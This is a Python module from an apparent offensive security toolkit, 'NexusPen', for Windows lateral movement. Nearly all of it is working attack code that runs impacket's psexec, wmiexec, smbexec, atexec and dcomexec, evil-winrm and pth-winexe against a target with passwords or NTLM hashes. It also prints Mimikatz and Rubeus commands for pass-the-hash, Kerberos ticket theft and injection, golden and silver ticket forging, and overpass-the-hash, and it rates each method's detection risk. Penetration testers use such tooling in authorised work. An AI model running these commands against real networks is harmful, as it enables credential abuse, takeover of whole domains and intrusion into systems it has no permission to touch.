#!/usr/bin/env python3
"""
NexusPen - Windows Lateral Movement Module
============================================
Lateral movement techniques for Windows networks.
"""

import subprocess
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class LateralMethod:
    """Lateral movement technique."""
    name: str
    protocol: str
    command: str
    requires_admin: bool
    ports: List[int]
    detection_risk: str


class WindowsLateralMovement:
    """
    Windows lateral movement techniques.
    """
    
    def __init__(self, target: str, username: str, password: str = None,
                 hashes: str = None, domain: str = '.'):
        self.target = target
        self.username = username
        self.password = password
        self.hashes = hashes
        self.domain = domain
    
    def psexec(self, command: str = 'cmd.exe') -> str:
        """PSExec lateral movement."""
        console.print(f"\n[cyan]🔧 PSExec to {self.target}...[/cyan]")
        
        if self.hashes:
            cmd = [
                'psexec.py', 
                f'{self.domain}/{self.username}@{self.target}',
                '-hashes', self.hashes, command
            ]
        else:
            cmd = [
                'psexec.py',
                f'{self.domain}/{self.username}:{self.password}@{self.target}',
                command
            ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def wmiexec(self, command: str = 'whoami') -> str:
        """WMIExec lateral movement."""
        console.print(f"\n[cyan]🔧 WMIExec to {self.target}...[/cyan]")
        
        if self.hashes:
            cmd = [
                'wmiexec.py',
                f'{self.domain}/{self.username}@{self.target}',
                '-hashes', self.hashes, command
            ]
        else:
            cmd = [
                'wmiexec.py',
                f'{self.domain}/{self.username}:{self.password}@{self.target}',
                command
            ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def smbexec(self, command: str = 'whoami') -> str:
        """SMBExec lateral movement."""
        console.print(f"\n[cyan]🔧 SMBExec to {self.target}...[/cyan]")
        
        if self.hashes:
            cmd = [
                'smbexec.py',
                f'{self.domain}/{self.username}@{self.target}',
                '-hashes', self.hashes
            ]
        else:
            cmd = [
                'smbexec.py',
                f'{self.domain}/{self.username}:{self.password}@{self.target}'
            ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def atexec(self, command: str = 'whoami') -> str:
        """ATExec (scheduled task) lateral movement."""
        console.print(f"\n[cyan]🔧 ATExec to {self.target}...[/cyan]")
        
        if self.hashes:
            cmd = [
                'atexec.py',
                f'{self.domain}/{self.username}@{self.target}',
                '-hashes', self.hashes, command
            ]
        else:
            cmd = [
                'atexec.py',
                f'{self.domain}/{self.username}:{self.password}@{self.target}',
                command
            ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def dcomexec(self, command: str = 'whoami') -> str:
        """DCOMExec lateral movement."""
        console.print(f"\n[cyan]🔧 DCOMExec to {self.target}...[/cyan]")
        
        if self.hashes:
            cmd = [
                'dcomexec.py',
                f'{self.domain}/{self.username}@{self.target}',
                '-hashes', self.hashes, command
            ]
        else:
            cmd = [
                'dcomexec.py',
                f'{self.domain}/{self.username}:{self.password}@{self.target}',
                command
            ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def winrm(self, command: str = 'whoami') -> str:
        """WinRM lateral movement."""
        console.print(f"\n[cyan]🔧 WinRM to {self.target}...[/cyan]")
        
        # Using evil-winrm
        cmd = [
            'evil-winrm', '-i', self.target,
            '-u', self.username
        ]
        
        if self.hashes:
            cmd.extend(['-H', self.hashes])
        else:
            cmd.extend(['-p', self.password])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def rdp(self) -> str:
        """RDP command generation."""
        console.print(f"\n[cyan]🖥️ RDP to {self.target}...[/cyan]")
        
        # xfreerdp command
        cmd = f'''
# Linux with xfreerdp
xfreerdp /u:{self.username} /p:'{self.password}' /v:{self.target} /dynamic-resolution

# With NLA disabled (old systems)
xfreerdp /u:{self.username} /p:'{self.password}' /v:{self.target} /sec:nla-

# Pass-the-Hash (requires Restricted Admin mode)
xfreerdp /u:{self.username} /pth:{self.hashes} /v:{self.target}

# Windows
mstsc /v:{self.target}
'''
        console.print(cmd)
        return cmd
    
    def ssh(self, command: str = 'whoami') -> str:
        """SSH to Windows (OpenSSH)."""
        console.print(f"\n[cyan]🔐 SSH to {self.target}...[/cyan]")
        
        cmd = ['ssh', f'{self.username}@{self.target}', command]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def get_all_methods() -> List[LateralMethod]:
        """Get all lateral movement methods."""
        methods = [
            LateralMethod(
                name='PSExec',
                protocol='SMB',
                command='psexec.py domain/user:pass@target',
                requires_admin=True,
                ports=[445],
                detection_risk='High'
            ),
            LateralMethod(
                name='WMIExec',
                protocol='WMI',
                command='wmiexec.py domain/user:pass@target',
                requires_admin=True,
                ports=[135, 445],
                detection_risk='Medium'
            ),
            LateralMethod(
                name='SMBExec',
                protocol='SMB',
                command='smbexec.py domain/user:pass@target',
                requires_admin=True,
                ports=[445],
                detection_risk='Medium'
            ),
            LateralMethod(
                name='ATExec',
                protocol='RPC/SMB',
                command='atexec.py domain/user:pass@target "cmd"',
                requires_admin=True,
                ports=[135, 445],
                detection_risk='Medium'
            ),
            LateralMethod(
                name='DCOMExec',
                protocol='DCOM',
                command='dcomexec.py domain/user:pass@target',
                requires_admin=True,
                ports=[135, 445],
                detection_risk='Low'
            ),
            LateralMethod(
                name='WinRM',
                protocol='HTTP/HTTPS',
                command='evil-winrm -i target -u user -p pass',
                requires_admin=True,
                ports=[5985, 5986],
                detection_risk='Low'
            ),
            LateralMethod(
                name='RDP',
                protocol='RDP',
                command='xfreerdp /v:target /u:user /p:pass',
                requires_admin=False,
                ports=[3389],
                detection_risk='Low'
            ),
            LateralMethod(
                name='SSH',
                protocol='SSH',
                command='ssh user@target',
                requires_admin=False,
                ports=[22],
                detection_risk='Low'
            ),
            LateralMethod(
                name='PowerShell Remoting',
                protocol='WinRM',
                command='Enter-PSSession -ComputerName target',
                requires_admin=True,
                ports=[5985, 5986],
                detection_risk='Low'
            ),
            LateralMethod(
                name='crackmapexec',
                protocol='Multiple',
                command='crackmapexec smb target -u user -p pass -x "whoami"',
                requires_admin=True,
                ports=[445],
                detection_risk='Variable'
            ),
        ]
        return methods
    
    @staticmethod
    def display_methods():
        """Display all lateral movement methods."""
        table = Table(title="Lateral Movement Methods", show_header=True,
                     header_style="bold blue")
        table.add_column("Method", style="cyan", width=20)
        table.add_column("Protocol", width=12)
        table.add_column("Ports", width=15)
        table.add_column("Detection", width=10)
        
        for method in WindowsLateralMovement.get_all_methods():
            table.add_row(
                method.name,
                method.protocol,
                ', '.join(map(str, method.ports)),
                method.detection_risk
            )
        
        console.print(table)


class PassTheHash:
    """
    Pass-the-Hash attacks.
    """
    
    def __init__(self, target: str, username: str, nthash: str, domain: str = '.'):
        self.target = target
        self.username = username
        self.nthash = nthash
        self.lmhash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM hash
        self.domain = domain
    
    def pth_winexe(self, command: str = 'cmd.exe') -> str:
        """Pass-the-Hash with pth-winexe."""
        cmd = [
            'pth-winexe',
            f'//{self.target}',
            '-U', f'{self.domain}/{self.username}%{self.lmhash}:{self.nthash}',
            command
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def pth_smbclient(self, share: str = 'C$') -> str:
        """Pass-the-Hash with smbclient."""
        cmd = f"smbclient //{self.target}/{share} -U '{self.domain}/{self.username}%{self.lmhash}:{self.nthash}' --pw-nt-hash"
        
        return f"Run: {cmd}"
    
    def impacket_pth(self, tool: str = 'psexec') -> str:
        """Impacket Pass-the-Hash."""
        cmd = f"{tool}.py {self.domain}/{self.username}@{self.target} -hashes {self.lmhash}:{self.nthash}"
        return cmd
    
    def mimikatz_pth(self) -> str:
        """Mimikatz Pass-the-Hash."""
        return f'''
# Mimikatz PTH
sekurlsa::pth /user:{self.username} /domain:{self.domain} /ntlm:{self.nthash} /run:cmd.exe

# With specific target
sekurlsa::pth /user:{self.username} /domain:{self.domain} /ntlm:{self.nthash} /run:"powershell -ep bypass"
'''


class PassTheTicket:
    """
    Pass-the-Ticket attacks.
    """
    
    def __init__(self, ticket_path: str = None):
        self.ticket_path = ticket_path
    
    def export_tickets(self) -> str:
        """Export Kerberos tickets with Mimikatz."""
        return '''
# Export all tickets
sekurlsa::tickets /export

# List current tickets
klist

# Rubeus export
Rubeus.exe dump /nowrap
'''
    
    def inject_ticket(self) -> str:
        """Inject ticket."""
        return f'''
# Mimikatz inject
kerberos::ptt {self.ticket_path}

# Rubeus inject
Rubeus.exe ptt /ticket:{self.ticket_path}

# Linux with impacket
export KRB5CCNAME={self.ticket_path}
'''
    
    def sticket_attack(self, domain: str, sid: str, krbtgt_hash: str) -> str:
        """Silver ticket attack."""
        return f'''
# Mimikatz Silver Ticket (for specific service)
kerberos::golden /domain:{domain} /sid:{sid} /target:target.domain.local /service:cifs /rc4:{krbtgt_hash} /user:Administrator /ptt

# Rubeus
Rubeus.exe silver /service:cifs/target.domain.local /rc4:{krbtgt_hash} /sid:{sid} /user:Administrator /ptt
'''
    
    def golden_ticket(self, domain: str, sid: str, krbtgt_hash: str) -> str:
        """Golden ticket attack."""
        return f'''
# Mimikatz Golden Ticket
kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{krbtgt_hash} /user:Administrator /id:500 /ptt

# Rubeus
Rubeus.exe golden /aes256:{krbtgt_hash} /domain:{domain} /sid:{sid} /user:Administrator /ptt

# Impacket ticketer
ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator
'''


class OverpassTheHash:
    """
    Overpass-the-Hash (Pass-the-Key) attacks.
    """
    
    @staticmethod
    def rubeus_asktgt(username: str, domain: str, hash_type: str,
                     hash_value: str) -> str:
        """Request TGT with Rubeus."""
        return f'''
# Rubeus Overpass-the-Hash
Rubeus.exe asktgt /user:{username} /domain:{domain} /{hash_type}:{hash_value} /ptt

# With AES key
Rubeus.exe asktgt /user:{username} /domain:{domain} /aes256:{hash_value} /ptt /opsec
'''
    
    @staticmethod
    def impacket_gettgt(username: str, domain: str, hash_value: str) -> str:
        """Request TGT with Impacket."""
        return f'''
# Impacket getTGT
getTGT.py {domain}/{username} -hashes :{hash_value}

# Export and use
export KRB5CCNAME={username}.ccache
psexec.py {domain}/{username}@target -k -no-pass
'''
